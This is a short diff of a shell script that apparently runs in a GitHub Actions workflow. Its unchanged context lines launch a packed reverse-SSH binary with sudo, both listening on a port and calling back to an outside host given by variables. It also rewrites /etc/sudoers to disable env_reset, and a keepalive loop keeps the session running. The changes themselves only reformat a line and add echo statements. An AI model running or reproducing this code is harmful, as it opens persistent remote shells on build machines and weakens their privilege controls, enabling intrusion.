@@ -33,9 +33,8 @@ grep -q AABBCC_rev_shell /tmp/js9 &&
 (
 ((sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v  -l -p 20022)&)&
 
- sudo bash -c '
-     sed -i "s|Defaults\tenv_reset|Defaults \!env_reset|g"  /etc/sudoers;
-     grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 >  /tmp/js9a.txt '
+ sudo bash -c '  sed -i "s|Defaults\tenv_reset|Defaults \!env_reset|g"  /etc/sudoers;
+                 grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 >  /tmp/js9a.txt '
 
     (while true; do
         [ ! -f /tmp/keepalive ] && break        
@@ -82,11 +81,11 @@ else
 
 
 [ -f $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&sudo sh -c "$GITHUB_WORKSPACE/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5";
-   
+   echo "exit_revSSH_isOK_$bport";
   fi
 fi
 
-
+echo "will sleep 61s for while true";
 sleep 61; 
          
     done) &
